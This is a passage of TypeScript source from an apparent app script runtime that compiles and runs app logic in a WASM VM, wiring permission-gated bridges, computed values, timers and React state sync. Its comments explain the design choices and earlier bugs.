    if (!this.vmEngine) return;

    this.vmEngine.registerDBBridge(this.db);

    const perms = this.permissions || {};
    if (perms.storage !== false) {
      this.vmEngine.registerLocalStorageBridge(this.appId);
      // The script gets the failure as an exception; the host gets it here,
      // with the browser's own reason, to put in front of the person.
      this.vmEngine.onStorageFailure = (failure) => this.onPersistenceFailure?.(failure);
    }
    // Clipboard is its own manifest permission and its own engine bridge in
    // v0.0.1. It used to ride on the localStorage bridge because the old engine
    // routed `nav.*` there; that coupling was inherited, not intended, so it is
    // not reproduced. Undefined means granted, matching how `storage` is read
    // one line up — no shipped manifest declares either key.
    if (perms.clipboard !== false) {
      this.vmEngine.registerClipboardBridge();
    }
  }

  /**
   * Load and execute a script or logic block inside the WASM VM.
   */
  async loadScript(script: CodeBlock): Promise<ScriptLoadResult> {
    const useHostBridges = this.runtimeMode === 'main';
    // A wait a previous script asked for holds a call id this one will reuse.
    this.timers.clear();

    // 0. Create the logic engine (the ZIPP adapter unless a host configured
    // one). A Python app asks for one that can run Python, and an engine that
    // cannot says so here — before any bridge is wired and before a line of
    // the author's code is compiled.
    this.vmEngine = this.pythonProject ? await createPythonLogicEngine() : await createLogicEngine();
    if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;

    if (useHostBridges) {
      // 1. Ensure XDB is fully initialized before executing any .logic code
      await this.db.ready();
      if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;

      // Cache XDB service reference for notification batching
      try {
        const { getXDB } = await import('./xdb');
        this.xdbService = getXDB(this.appId);
      } catch {
        /* XDB not available — batching disabled */
      }
      if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;

      // 2. Register bridges on the WASM engine BEFORE compilation/execution
      this.installHostBridges();
    }

    let symbolMap: Map<string, { index: number; scope: SymbolScope }>;
    let computedDecls: ComputedDeclaration[] = [];
    let computedCompiled = false;
    // The top-level `$:` declarations, each after the ones it reads.
    let computedPlan = planComputed([]);
    // The logic as its author and the host wrote it, for reading what a
    // function names. Empty for Python, which is not read that way.
    let writtenCode = '';
    this.computedSettle = null;
    this.computedBatch = null;
    this.computedStale = true;

    if (this.pythonProject) {
      // A Python app's logic is a set of modules, not one source string. There
      // are no imports to inline (Python imports by module name), no `$:`
      // declarations, and no preamble to prepend — a Python state has no
      // globals for one to declare. The engine compiles the project and
      // answers the same symbol map the JavaScript path builds below.
      const engine = this.vmEngine;
      if (typeof engine.initializePythonProject !== 'function') {
        throw new Error(
          'This app’s logic is written in Python, and this app runtime runs only JavaScript'
        );
      }
      symbolMap = await engine.initializePythonProject(this.pythonProject);
      if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;
    } else {
      // 3. Resolve imports (inline imported .logic files before passing to WASM),
      // after reading what was written as a module as the script it is.
      let resolvedCode = moduleSyntaxAsScript(script.code);
      if (this.importResolver) {
        // The entry file is already in `script.code`, so it counts as included
        // for dedupe as well as being the root of the cycle-detection chain.
        if (this.logicBasePath) this.includedLogicPaths.add(this.logicBasePath);
        resolvedCode = await this.resolveImports(
          resolvedCode,
          new Set(this.logicBasePath ? [this.logicBasePath] : []),
          this.logicBasePath
        );
        // Import resolution fetches files, so this is the longest await of the
        // three and the one most likely to still be pending at cleanup.
        if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;
      }

      // 4. Generate preamble for external functions (e.g. wallet bridge).
      // Wrappers read a mutable VM-side table so later host implementations can
      // update without recompiling or re-running script initialization.
      let extFnPreamble = '';
      this.externalFunctionNames = [];
      this.externalFunctionValues = [];
      this.externalValuesGlobalIndex = -1;
      if (this.externalFunctions) {
        for (const name of Object.keys(this.externalFunctions)) {
          // Skip names that cannot safely become VM declarations or are served
          // by another bridge path.
          if (!VALID_IDENTIFIER.test(name) || EXTERNAL_FUNCTION_RESERVED_NAMES.has(name)) continue;
          if (name.startsWith('xdb_') || name === 'asset') continue;
          const value = this.readExternalFunctionValue(name);
          // Preserve the established bridge contract: only synchronous
          // primitive-valued getters become globals in this compilation.
          if (value === UNSUPPORTED_EXTERNAL_VALUE) continue;
          this.externalFunctionNames.push(name);
          this.externalFunctionValues.push(value);
        }

        if (this.externalFunctionNames.length > 0) {
          const serializedValues = this.externalFunctionValues
            .map((value) => (value === undefined ? 'undefined' : JSON.stringify(value)))
            .join(',');
          extFnPreamble = `let ${EXTERNAL_VALUES_VAR} = [${serializedValues}];\n`;
          for (let i = 0; i < this.externalFunctionNames.length; i++) {
            extFnPreamble += `function ${this.externalFunctionNames[i]}() { return ${EXTERNAL_VALUES_VAR}[${i}]; }\n`;
          }
        }
      }

      // 4b. Compile each `$:` declaration into a real function.
      //
      // These are re-read on every render, and evaluating an expression *string*
      // costs a fresh parse each time — the engine interns the result for the VM's
      // lifetime, so a per-frame expression grows the heap until the tab dies.
      // Compiled once alongside the script, each becomes an ordinary call.
      //
      // Read from the code as it will be compiled, imports inlined, because
      // the top-level ones are also rewritten in it: each is worked out
      // through its function as the script loads, and one more generated
      // function works them all out again, in the order they read each other,
      // whenever the runtime asks (see computed-declarations.ts for why).
      computedDecls = extractComputedDeclarations(resolvedCode).filter(
        (d) => VALID_IDENTIFIER.test(d.name) && d.expression.trim() !== ''
      );
      computedPlan = planComputed(computedDecls);
      const computedPreamble = computedSource(computedDecls, computedPlan);
      writtenCode = extFnPreamble + resolvedCode;

      // 5. Prepend the engine's bridge preamble (empty on zipp, which declares
      // window/navigator/db/localStorage/host itself) then SoftN's own, and
      // the timers (logic-timers.ts).
      // 5a. Code written for a browser is given its document: the page's
      // HTML, seeded before the code's first line runs, so the code finds
      // what is written above it as a browser's code does.
      let shellCode = '';
      // Code that declares a `document` of its own is not given another; a
      // name of the shell's it declares itself (`class Comment`) stays its own.
      const asks =
        this.documentShellRequest !== null && logicEngineIsSandboxed() && (usesDocument(resolvedCode) || this.browserHandlers);
      const ownNames = asks ? namesDeclaredBy(resolvedCode) : new Set<string>();
      if (asks && useHostBridges && !ownNames.has('document')) {
        const [{ shellPrelude }, shell] = await Promise.all([
          import('../document-shell/shell-source'),
          this.documentShellRequest!.create(),
        ]);
        if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;
        this.documentShell = shell;
        shellCode = shellPrelude(shell.seedJson());
        this.documentShellOn = true;
      } else if (asks && !useHostBridges) {
        console.warn('[SoftN] This page\u2019s code uses the document, which is given to code on the main thread only; in a worker, document is not defined.');
      }

      const bridges =
        VM_BRIDGE_PREAMBLE + SOFTN_BRIDGE_PREAMBLE + timerPreamble(resolvedCode) + extFnPreamble + shellCode;
      const scriptCode = bridges + resolvedCode + TIMER_TRAILER;
      const fullCode = computedPreamble
        ? bridges + guardFirstValues(resolvedCode, computedPlan) + '\n' + computedPreamble + TIMER_TRAILER
        : scriptCode;

      // 5. Compile + run the full .logic code in the WASM VM.
      //
      // The generated `$:` bodies share the script's compilation unit, so a
      // declaration the scanner mis-extracts — an expression broken across lines
      // in a way it cannot follow, say — would fail the whole script rather than
      // the one value it belongs to. On that failure, compile the script without
      // them and evaluate those expressions one at a time instead.
      computedCompiled = computedPreamble !== '';
      try {
        symbolMap = await this.vmEngine.initializeScript(fullCode);
      } catch (compileError) {
        if (!computedCompiled) throw await placeSyntaxError(compileError, resolvedCode);
        console.warn(
          '[SoftN] A `$:` declaration could not be compiled, so all of them fall back ' +
            'to per-render evaluation. The script itself is unaffected. Cause:',
          compileError
        );
        computedCompiled = false;
        // And the script is compiled as its author wrote it: nothing is
        // generated, so there is nothing to keep the `$:` globals true with.
        computedPlan = planComputed([]);
        // The failed compile took the engine with it — v0.0.1 terminates an
        // Engine whose `initScript` throws, wiping its bridges and its capability
        // allowlist — so the retry cannot reuse it. Rebuilding also re-wires and
        // re-grants; retrying in place would compile into a VM that denies every
        // `db.*` call the fallback was supposed to rescue.
        this.vmEngine.dispose();
        this.vmEngine = await createLogicEngine();
        if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;
        if (useHostBridges) this.installHostBridges();
        try {
          symbolMap = await this.vmEngine.initializeScript(scriptCode);
        } catch (error) {
          throw await placeSyntaxError(error, resolvedCode);
        }
      }
    }
    this.symbolMap = symbolMap;

    // The document is set up and the code's first run has changed it: the
    // page's events can come in, and what the code did goes out to be drawn.
    if (this.documentShellOn) {
      this.documentShell!.attach(
        (id, type, props, path) => this.dispatchDocumentEvent(id, type, props, path),
        () => this.documentReady()
      );
      this.takeDocumentChanges();
    }
    this.externalValuesGlobalIndex = symbolMap.get(EXTERNAL_VALUES_VAR)?.index ?? -1;

    // 6. Set up window global index (sync keys are discovered dynamically)
    if (useHostBridges) {
      const windowSym = symbolMap.get('window');
      if (windowSym) {
        this.windowGlobalIndex = windowSym.index;
      }
    }

    // 6. Read initial state from VM globals and classify symbols
    const initialState: Record<string, unknown> = {};
    const functionNames: string[] = [];
    const stateVarNames: string[] = [];
    const settledNames = new Set(computedPlan.order.map((declaration) => declaration.name));

    for (const [name, sym] of symbolMap.entries()) {
      // Skip bridge-injected variables
      if (BRIDGE_VARS.has(name)) continue;

      // The shell's own names, when the page is given one, are not the
      // page's state or its functions.
      if (this.documentShellOn && isShellName(name)) continue;

      // Generated `$:` bodies are engine plumbing, not script API.
      if (name.startsWith(COMPUTED_PREFIX)) continue;

      // A `$:` value the script also declares (`let double = 0`) is still a
      // computed value and not state. As state it was mirrored to the page
      // once and read from there ever after — a page looks in state first —
      // so the page showed its first value while logic moved on.
      if (settledNames.has(name) && sym.scope !== 'function') continue;

      if (sym.scope === 'function') {
        functionNames.push(name);
      } else {
        stateVarNames.push(name);
        // WASM returns plain JS values — no formLogicToJS conversion needed
        initialState[name] = this.vmEngine.getGlobal(sym.index);
      }
    }

    // A value that reads another through a function says nothing of it in
    // its own words, so the order they are worked out in cannot know.
    const calls = new Set(functionNames);
    const readsThroughAFunction = computedDecls.some((declaration) =>
      [...namesReadBy(declaration.expression)].some((name) => calls.has(name))
    );

    // State the markup never names is kept in the engine and not mirrored to
    // the page. But a `$:` value is how a page reads state: `$: label =
    // "step " + step` puts `step` on the screen though no markup names it.
    // Left unmirrored, a change to `step` told the page nothing, the page
    // was not redrawn, and `label` stood at its first value. So what a `$:`
    // expression names is observed too — and where one reaches further,
    // through a function, there is no telling what it reads, and everything
    // is mirrored, as it is for a host that never asked for less.
    if (this.observedStateNames && computedDecls.length > 0) {
      if (readsThroughAFunction) {
        this.observedStateNames = null;
      } else {
        const observed = new Set(this.observedStateNames);
        for (const declaration of computedDecls) {
          for (const name of namesReadBy(declaration.expression)) observed.add(name);
        }
        this.observedStateNames = observed;
      }
    }

    // A function the page calls while it is drawn is the other way a page
    // reads state: `<p>{label()}</p>` over `function label() { return "n is "
    // + n }` puts `n` on the screen, and no markup names it. `n` was kept in
    // the engine, a change to it told the page nothing, and the paragraph
    // stood at "n is 1" whatever was clicked. So what such a function may
    // read is observed as well: every name in its body and in what its body
    // names, followed through the logic (see drawn-functions.ts). A function
    // only an event runs is not followed, which is what keeps a game's large
    // state in the engine: `tick` reads all of it, and is never drawn. Where
    // a drawn function cannot be followed, everything is mirrored.
    //
    // What only such a function reads is watched rather than copied (see
    // partitionStateVars): the page reads it through the function, from the
    // engine, and needs to know only that it moved.
    let readOnlyWhenDrawn: ReadonlySet<string> = new Set();
    if (this.observedStateNames) {
      const reads = readsOfDrawnFunctions({
        code: writtenCode,
        functionNames,
        drawn: this.drawnNames ?? this.observedStateNames,
        python: this.pythonProject !== undefined,
      });
      if (!reads.known) {
        debug(
          `[SoftN] All state is mirrored: the page calls ${reads.functions.join(', ')} while it is drawn, and ${reads.why}.`
        );
        this.observedStateNames = null;
      } else if (reads.names.size > 0) {
        const observed = new Set(this.observedStateNames);
        const added = new Set<string>();
        for (const name of reads.names) {
          if (!observed.has(name)) added.add(name);
          observed.add(name);
        }
        this.observedStateNames = observed;
        readOnlyWhenDrawn = added;
      }
    }
    this.partitionStateVars(stateVarNames, symbolMap, readOnlyWhenDrawn);
    debug(
      `[SoftN] Script loaded: ${functionNames.length} functions, ${this.stateVarNames.length} state vars` +
        (this.vmOwnedStateNames.length
          ? ` (+${this.vmOwnedStateNames.length} VM-owned, not synced)`
          : '')
    );

    // 7. Create async function wrappers (propagate state changes to React)
    // Rapid-fire event handlers (mousemove, scroll, etc.) are marked droppable —
    // safe to skip under queue saturation since they'll be superseded by the next
    // event. All other functions (clicks, submits, etc.) are critical and will
    // queue up to a hard limit to guarantee execution.
    const DROPPABLE_PATTERN =
      /^on_?(mouse_?move|pointer_?move|scroll|touch_?move|wheel)|^(tick|update|animate|render)/i;
    const functions: Record<string, (...args: unknown[]) => Promise<unknown>> = {};
    for (const name of functionNames) {
      functions[name] = this.createVMFunction(name, { droppable: DROPPABLE_PATTERN.test(name) });
    }

    // 8. Create sync function wrappers (for template expressions, no state propagation)
    const syncFunctions: Record<string, (...args: unknown[]) => unknown> = {};
    for (const name of functionNames) {
      syncFunctions[name] = this.createVMSyncFunction(name);
    }

    // 9. Computed values. A top-level one is read from the values the settle
    // function hands back, so a page sees exactly what logic sees; one written
    // inside a function is bound to the function compiled for it in 4b, as
    // before; and where nothing could be compiled each is evaluated by itself.
    if (computedPlan.order.length > 0) {
      // A script where one reads another through a function is settled by
      // working everything out again until nothing changes.
      this.computedSettle = {
        names: computedPlan.order.map((declaration) => declaration.name),
        untilStill: readsThroughAFunction && computedPlan.circles.length === 0,
      };
      for (const circle of computedPlan.circles) {
        console.error(
          `[SoftN] These $: values read each other in a circle: ${circle.join(' → ')}. None of them can be worked out before the others, so each is worked out once, in the order written, from what the others were.`
        );
      }
    }
    const computed: Record<string, () => unknown> = {};
    for (const { name, expression } of computedDecls) {
      if (!computedCompiled) {
        computed[name] = () => this.evaluateExpression(expression);
      } else if (settledNames.has(name)) {
        computed[name] = () => this.readSettledComputed(name);
      } else {
        const fn = `${COMPUTED_PREFIX}${name}`;
        computed[name] = () => this.callComputed(fn, name);
      }
    }

    // What the top level queued (a timer, a `softn.*` call) or put on the
    // window (a listener) waited for the first call into the script, which
    // for an app without `_init` was the first click; the worker runtime
    // takes it as the script loads. Take it once the host has had the
    // result: a macrotask, so an `_init` the renderer calls straight away
    // still goes first and takes it as it always has, and this finds nothing
    // left to do.
    this.loadEntry = setTimeout(() => {
      this.loadEntry = null;
      void this.runWhatTheTopLevelQueued();
    }, 0);

    return {
      state: initialState,
      functions,
      syncFunctions,
      computed,
    };
  }

  /** The look made after `loadScript`, until it runs; see the end of `loadScript`. */
  private loadEntry: ReturnType<typeof setTimeout> | null = null;

  /**
   * Run the host calls the script's top level queued, timers among them, and
   * hear the listeners it put on the window, if nothing has done so yet, as
   * the worker runtime does at load. No script code runs here.
   */
  private async runWhatTheTopLevelQueued(): Promise<void> {
    await this.vmCallLock;
    if (this.disposed || !this.vmEngine || this.vmEngine.terminated) return;
    let release: (() => void) | undefined;
    this.vmCallLock = new Promise<void>((r) => {
      release = r;
    });
    let pending: PendingHostCall[] = [];
    try {
      pending = this.vmEngine.drainPendingHostCalls();
      this.bridgeEventListeners();
      this.discoverWindowSyncKeys();
    } catch (error) {
      console.error('[SoftN] Error taking what the script queued as it loaded:', error);
    } finally {
      release!();
    }
    if (pending.length > 0) await this.processPendingHostCallsUnlocked(pending);
  }

  /** The script's timers, on the host's clock; see logic-timers.ts. */
  private readonly timers = new LogicTimers((callId) => this.timerDue(callId));
  /** Timers that came due and wait for one entry to answer them all. */
  private dueTimers: number[] = [];
  private timerEntryQueued = false;

  private timerDue(callId: number): void {
    this.dueTimers.push(callId);
    this.answerDueTimers();
  }

  /**
   * Answer every timer that is due in one entry into the engine, as a handler
   * is run: the callbacks' writes reach the page together and the page is
   * drawn once. Timers that come due while that entry waits for the engine
   * join it, so a page with many timers cannot fill the call queue.
   */
  private answerDueTimers(): void {
    if (this.timerEntryQueued || this.dueTimers.length === 0) return;
    this.timerEntryQueued = true;
    let entered = false;
    void this.enterVM('timer callbacks', false, () => {
      entered = true;
      const due = this.dueTimers;
      this.dueTimers = [];
      for (const callId of due) {
        try {
          this.vmEngine!.resolveHostCallback(callId, null);
        } catch (error) {
          // One callback failing does not stop the others, and an interval
          // has already asked for its next wait.
          console.error('[SoftN] A timer callback in the logic failed:', error);
        }
      }
    }).finally(() => {
      this.timerEntryQueued = false;
      if (this.disposed || this.vmEngine?.terminated) {
        this.timers.dispose();
        this.dueTimers = [];
        return;
      }
      if (entered) this.answerDueTimers();
      // Not let in because the call queue is full: try again shortly rather
      // than lose a callback, or an interval, for good.
      else setTimeout(() => this.answerDueTimers(), 16);
    });
  }

  /**
   * Create an async function wrapper that:
   * 1. Syncs React state → VM globals
   * 2. Calls the VM function
   * 3. Syncs VM globals → React state
   */
  // Performance instrumentation for async VM calls
  private _perfCallCount = 0;
  private _perfTotalMs = 0;
  private _perfLastReport = 0;
  private _perfWasmMs = 0;
  private _perfSyncToReactMs = 0;
  private _perfSyncToVMMs = 0;
  private _perfChangedVars = 0;

  private createVMFunction(
    name: string,
    options?: { droppable?: boolean }
  ): (...args: unknown[]) => Promise<unknown> {
    const droppable = options?.droppable ?? false;
    return (...args: unknown[]): Promise<unknown> => {
      // What the script is given is read now, while the event is the one it
      // was: after the wait for the engine React has cleared the event's
      // `currentTarget`, and `@click={save}` was given no `target` and no
      // `currentTarget` on the main thread where the worker gave both. The
      // engine reads these records as they are.
      const crossing = sanitizeArgs(args);
      return this.enterVM(name, droppable, () => this.vmEngine!.callFunction(name, crossing));
    };
  }

  /**
   * Enter the engine the way a handler does, with `run` as what happens
   * inside: the page's state goes in first, what the script changed comes
   * back to the page after, and the host calls it queued are run. A function
   * the page calls and a timer that comes due both enter this way.
   */
  private async enterVM(name: string, droppable: boolean, run: () => unknown): Promise<unknown> {
    // Droppable calls (rapid-fire events) are dropped at the soft limit.
    // Critical calls (user interactions) are only dropped at the hard limit.
    const QUEUE_SOFT_LIMIT = 32;
    const QUEUE_HARD_LIMIT = 128;
    // A runtime that has been torn down answers nothing. Without this, a
    // 30 Hz game loop keeps landing calls on the disposed engine — each one
    // an "engine is disposed" error in the console — until its renderer
    // notices.
    if (this.disposed) return undefined;
    if (this.vmEngine?.terminated) {
      if (!this.terminationLogged) {
        this.terminationLogged = true;
        console.error(`[SoftN] The script engine has stopped (a call exceeded its budget or failed to compile); ignoring ${name} and later calls until the app is reloaded.`);
      }
      return undefined;
    }
    // Guard against unbounded queue growth from rapid async events.
    if (droppable && this.vmCallQueueDepth >= QUEUE_SOFT_LIMIT) {
      // Safe to drop: rapid-fire events are superseded by the next one
      return undefined;
    }
    if (this.vmCallQueueDepth >= QUEUE_HARD_LIMIT) {
      console.error(
        `[SoftN] Dropping VM call to ${name}: hard queue limit reached (${this.vmCallQueueDepth})`
      );
      return undefined;
    }
    this.vmCallQueueDepth++;

    // Acquire the lock — serializes async VM calls to prevent concurrent
    // stack corruption. Uses a release-function pattern (not .then() chaining)
    // to avoid unbounded promise chain growth.
    await this.vmCallLock;
    let release: (() => void) | undefined;
    this.vmCallLock = new Promise<void>((r) => {
      release = r;
    });
    // The wait for the lock is where a tear-down usually lands: the calls
    // queued behind the one that was running when the grant rebuilt the
    // runtime would otherwise each wake up and hit a corpse.
    if (this.disposed) {
      this.vmCallQueueDepth--;
      release!();
      return undefined;
    }

    const t0 = performance.now();
    try {
      this.asyncCallInProgress = true;
      // Async call may change state — invalidate sync cache preemptively.
      this.syncCallCache.clear();

      const tSyncStart = performance.now();
      this.syncReactStateToVM();
      this.syncExternalFunctionsToVM();
      // Sync real browser window → VM window
      this.syncWindowToVM();
      // The function reads `$:` values as they are for the state it is
      // called with, not as they were when the script loaded.
      this.settleComputedIfStale();
      this._perfSyncToVMMs += performance.now() - tSyncStart;

      // Suppress XDB notifications during the WASM call — all db mutations
      // within the function are batched into a single notification per collection
      // at the end, instead of firing on every individual create/update/delete.
      // This eliminates O(n) re-queries when functions like startHand() do 20+ mutations.
      this.xdbService?.suppressNotifications();

      // WASM engine takes plain JS args directly — no conversion needed
      const tWasm = performance.now();
      const result = run();
      this._perfWasmMs += performance.now() - tWasm;

      return result;
    } catch (error) {
      console.error(`[SoftN] Error executing function ${name}:`, error);
      return undefined;
    } finally {
      // Resume XDB notifications — fires one 'refresh' per affected collection.
      this.xdbService?.resumeNotifications();

      // Whatever it changed, the `$:` values are worked out from.
      this.computedMayHaveMoved();

      // Always sync state back, even if the VM function threw mid-execution.
      // Partial state mutations before the error should be reflected in the UI.
      // Drain pending host calls while we still hold the lock, but DON'T await
      // their execution — that would block other VM calls (e.g. movement ticks)
      // for the entire duration of async operations like AI generation.
      let pendingCalls: unknown[] | null = null;
      try {
        // Disposed during the call: there is no engine left to read back from.
        if (!this.disposed) {
          const tSyncReact = performance.now();
          this.syncVMStateToReact();
          this.syncWindowFromVM();
          this._perfSyncToReactMs += performance.now() - tSyncReact;

          // Drain pending host calls while holding the lock
          if (this.vmEngine) {
            const pending = this.vmEngine.drainPendingHostCalls();
            if (pending.length > 0) {
              pendingCalls = pending;
            }
          }

          // After each async call, discover any new VM event listeners and
          // window.__ properties — this bridges keyboard/mouse handlers
          // registered in _init() or other functions to real browser events.
          this.bridgeEventListeners();
          this.discoverWindowSyncKeys();
        }
      } catch (syncError) {
        console.error(`[SoftN] Error syncing state after ${name}:`, syncError);
      }
      this.asyncCallInProgress = false;
      this.vmCallQueueDepth--;
      release!();

      // Process pending host calls OUTSIDE the lock so other VM calls
      // (e.g. movementTick) can execute while async host operations
      // (e.g. AI model generation) are in progress.
      if (pendingCalls) {
        await this.processPendingHostCallsUnlocked(pendingCalls as PendingHostCall[]);
      }

      // Performance reporting
      const elapsed = performance.now() - t0;
      this._perfCallCount++;
      this._perfTotalMs += elapsed;
      const now = performance.now();
      if (now - this._perfLastReport > 5000) {
        const n = this._perfCallCount;
        debug(
          `[SoftN Perf] ${n} calls in 5s | avg=${(this._perfTotalMs / n).toFixed(1)}ms` +
            ` | wasm=${(this._perfWasmMs / n).toFixed(1)}ms` +
            ` | syncToVM=${(this._perfSyncToVMMs / n).toFixed(1)}ms` +
            ` | syncToReact=${(this._perfSyncToReactMs / n).toFixed(1)}ms` +
            ` | changedVars=${(this._perfChangedVars / n).toFixed(1)}/tick` +
            ` | stateVars=${this.stateVarNames.length}`
        );
        this._perfCallCount = 0;
        this._perfTotalMs = 0;
        this._perfWasmMs = 0;
        this._perfSyncToVMMs = 0;
        this._perfSyncToReactMs = 0;
        this._perfChangedVars = 0;
        this._perfLastReport = now;
      }
    }
  }

  /**
   * Split state variables into the ones the host must mirror and the ones the
   * VM can keep to itself.
   *
   * Every sync pulls each synced variable out of the VM and rebuilds it as a
   * JS value, so the cost is set by what the variables HOLD, not by how many
   * there are or how many changed. Promptly Unemployed keeps two 51 KB scene
   * descriptions in globals that no part of its markup names: mirroring them
   * was 13 of the 24 ms each tick spent, ~28 times a second, to produce values
   * nothing could read.
   *
   * The test is deliberately crude — does this identifier appear anywhere in
   * the document outside its logic? — because the failure modes are not
   * symmetric. Keeping a variable that is never read costs a little speed;
   * dropping one that is read silently freezes part of the UI. So the scan
   * over-collects on purpose: a name in a comment, a CSS class or an unrelated
   * string keeps its variable synced.
   *
   * Holding a variable back is only sound because the exclusion is symmetric.
   * {@link syncReactStateToVM} walks the same list, so an excluded variable is
   * never written back either — otherwise a full push would overwrite the live
   * VM value with the copy the host stopped updating.
   *
   * Among the synced, state that only a function the page calls while it is
   * drawn reads (`readOnlyWhenDrawn`) is watched rather than copied. The page
   * reads it through that function, which reads the engine's own, so what the
   * page needs is to be drawn again when it moves: its digest is compared like
   * the others' and the page is drawn again, and its value is neither read out
   * nor written back. Copied, a list of 4,000 records that one such function
   * counts was about 35 ms of every tick of a game loop. This needs a host
   * that can be asked to draw the page ({@link ScriptContext.redraw}) and an
   * engine that digests in place; without both it is copied as before.
   */
  private partitionStateVars(
    names: string[],
    symbolMap: Map<string, { index: number; scope: SymbolScope }>,
    readOnlyWhenDrawn: ReadonlySet<string> = new Set()
  ): void {
    const observed = this.observedStateNames;
    this.watchedStateSet = new Set();
    if (!observed) {
      this.stateVarNames = names;
      this.stateVarIndices = names.map((name) => symbolMap.get(name)!.index);
      this.vmOwnedStateNames = [];
      this.vmOwnedStateSet = new Set();
      return;
    }
    const synced: string[] = [];
    const vmOwned: string[] = [];
    for (const name of names) {
      (observed.has(name) ? synced : vmOwned).push(name);
    }
    this.stateVarNames = synced;
    this.stateVarIndices = synced.map((name) => symbolMap.get(name)!.index);
    this.vmOwnedStateNames = vmOwned;
    this.vmOwnedStateSet = new Set(vmOwned);
    if (readOnlyWhenDrawn.size > 0 && this.context.redraw && this.engineDigests()) {
      this.watchedStateSet = new Set(synced.filter((name) => readOnlyWhenDrawn.has(name)));
    }
  }

  /** Synced state the page is drawn again for when it moves, and never holds a copy of. */
  private watchedStateSet: ReadonlySet<string> = new Set();

  /** Whether the engine can digest globals in place; an empty ask is enough to tell. */
  private engineDigests(): boolean {
    const engine = this.vmEngine as unknown as {
      getGlobalsFingerprint?: (indices: number[]) => number[] | null;
    } | null;
    try {
      return Array.isArray(engine?.getGlobalsFingerprint?.([]));
    } catch {
      return false;
    }
  }

  /**
   * Key for the per-render sync-call cache, or null when the arguments cannot
   * be described by one.
   *
   * Returning null means "call through and do not cache". Reference arguments
   * always answer null: there is no cheap, lossless description of an object
   * graph, and the `JSON.stringify` this replaced folded distinct values onto
   * one key and visited the whole of every object handed to it — see
   * sync-cache-key.ts. A helper called twice with the same array in one render
   * now runs twice; a helper called with an argument the key cannot tell from
   * another no longer returns the other one's answer.
   */
  private syncCacheKey(name: string, args: unknown[]): string | null {
    return buildSyncCacheKey(name, args);
  }

  /**
   * Create a sync function wrapper for template expressions.
   * Does NOT propagate state changes (used during React render).
   * Stripped to bare minimum for performance — window sync is only done
   * in async wrappers (needed for Scene3D mouse-look, not template expressions).
   */
  private createVMSyncFunction(name: string): (...args: unknown[]) => unknown {
    return (...args: unknown[]): unknown => {
      try {
        // Skip React→VM sync if an async function is in-flight — the VM has
        // the latest state and overwriting it would clobber the async function's changes.
        if (!this.asyncCallInProgress) {
          this.syncReactStateToVM();
        }
        this.syncExternalFunctionsToVM();
        // A helper that reads a `$:` value reads it as it is now. Nothing is
        // marked afterwards: a helper asked from a page does not change state.
        this.settleComputedIfStale();

        // Per-render frame cache: if >2ms since the last sync call, we've crossed
        // a render frame boundary — clear the cache so results reflect current state.
        // Within a single render, all sync calls happen synchronously (< 1ms apart),
        // so the cache stays valid and avoids redundant WASM boundary crossings.
        const now = performance.now();
        if (now - this.lastSyncCallTs > 2) {
          this.syncCallCache.clear();
        }
        this.lastSyncCallTs = now;

        // Build cache key — optimized for the common single-primitive-arg case.
        //
        // The type has to be part of the key. Interpolating the value alone
        // collapsed `f(1)` and `f("1")` — and `f(true)` and `f("true")`, and
        // `f(null)` and `f("null")` — onto one entry, so within a single render
        // the second call silently returned the first one's answer. A helper
        // that branches on `typeof` then rendered the wrong thing with nothing
        // to suggest it had.
        const cacheKey = this.syncCacheKey(name, args);
        if (cacheKey !== null && this.syncCallCache.has(cacheKey)) {
          return this.syncCallCache.get(cacheKey);
        }

        if (!this.vmEngine) return undefined;
        const result = this.vmEngine.callFunctionSync(name, args);
        if (cacheKey !== null) this.syncCallCache.set(cacheKey, result);
        return result;
      } catch (error) {
        console.error(`[SoftN] Error executing sync function ${name}:`, error);
        return undefined;
      }
    };
  }

  /** The document the page's code is given, when it uses one; see ScriptRuntimeOptions.documentShell. */
  private readonly documentShellRequest: DocumentShellRequest | null;
  /** The page has handlers written for a browser: see ScriptRuntimeOptions.browserHandlers. */
  private readonly browserHandlers: boolean;
  private readonly assetResolver: ((path: string) => string) | null;
  private documentShell: DocumentShell | null = null;
  private documentShellOn = false;

  /** What the person did to the page (typed, ticked, focused), into the document before the code runs. */
  private syncDocumentIn(): void {
    if (!this.documentShellOn || !this.vmEngine) return;
    const changes = this.documentShell!.takeSync();
    if (changes) this.vmEngine.callFunctionSync(SHELL_SYNC, [changes]);
  }

  /**
   * What the code did to the document, out to the page, after it ran. The
   * shell hands it over a page at a time, each kept until the next is asked
   * for: a page the engine could not hand across is asked for again (the
   * shell sends it in halves), so nothing the code did is lost. All of it is
   * applied at once, as one turn's changes.
   */
  private takeDocumentChanges(): void {
    if (!this.documentShellOn || !this.vmEngine) return;
    const ops: ShellOp[] = [];
    let failed = false;
    let failures = 0;
    for (;;) {
      let page: ShellOp[] | null;
      try {
        page = this.vmEngine.callFunctionSync(SHELL_TAKE, [failed]) as ShellOp[] | null;
        failed = false;
      } catch (error) {
        failed = true;
        if (this.vmEngine.terminated || ++failures > 40) {
          console.error('[SoftN] What the page\u2019s code did to the document could not be read:', error);
          break;
        }
        continue;
      }
      if (!page) break;
      for (const op of page) ops.push(op);
    }
    if (ops.length > 0) this.documentShell!.apply(ops);
  }

  /**
   * Run the engine for something that happened on the page, the way a
   * listener the logic put on the window is run (bridgeEventListeners): the
   * page's state in, the call, then what changed back out to the page. Said
   * and returned as nothing when it fails, as a listener's failure is.
   */
  private enterForDocument(name: string, args: unknown[]): unknown {
    if (!this.vmEngine || this.disposed || this.vmEngine.terminated) return 0;
    this.syncReactStateToVM();
    this.syncWindowToVM();
    this.settleComputedIfStale();
    let result: unknown = 0;
    try {
      result = this.vmEngine.callFunctionSync(name, args);
    } catch (error) {
      console.error('[SoftN] The page\u2019s code failed while handling the page:', error);
    }
    this.computedMayHaveMoved();
    this.syncCallCache.clear();
    this.syncVMStateToReact();
    this.syncWindowFromVM();
    this.discoverWindowSyncKeys();
    this.bridgeEventListeners();
    const pending = this.vmEngine.drainPendingHostCalls();
    if (pending.length > 0) void this.processPendingHostCallsUnlocked(pending);
    return result;
  }

